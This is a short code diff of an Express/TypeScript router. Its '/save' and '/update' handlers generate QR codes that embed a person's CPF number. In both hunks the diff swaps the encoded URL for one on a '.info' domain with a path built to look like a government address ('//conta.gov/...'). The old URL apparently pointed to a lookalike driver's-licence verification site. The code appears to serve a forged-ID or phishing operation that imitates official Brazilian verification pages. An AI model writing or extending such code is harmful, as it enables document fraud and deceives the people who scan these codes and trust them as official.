@@ -110,7 +110,7 @@ router.post('/save', async (req, res) => {
     let qrcodeUrl: string | null = null;
     let qrPngBytes: Uint8Array | null = null;
     try {
-      const qrData = `https://condutor-cnhdigital-vio-web.info/verificar?cpf=${cleanCpf}`;
+      const qrData = `https://qrcode-certificadodigital-vio.info//conta.gov/app/informacoes_usuario.php?id=${cleanCpf}`;
       const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(qrData)}&format=png`;
       const qrResp = await fetch(qrApiUrl);
       if (qrResp.ok) {
@@ -293,7 +293,7 @@ router.post('/update', async (req, res) => {
     if (changed.length > 0) {
       try {
         // QR Code
-        const qrData = `https://condutor-cnhdigital-vio-web.info/verificar?cpf=${cleanCpf}`;
+        const qrData = `https://qrcode-certificadodigital-vio.info//conta.gov/app/informacoes_usuario.php?id=${cleanCpf}`;
         const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(qrData)}&format=png`;
         const qrResp = await fetch(qrApiUrl);
         let qrPngBytes: Uint8Array | null = null;
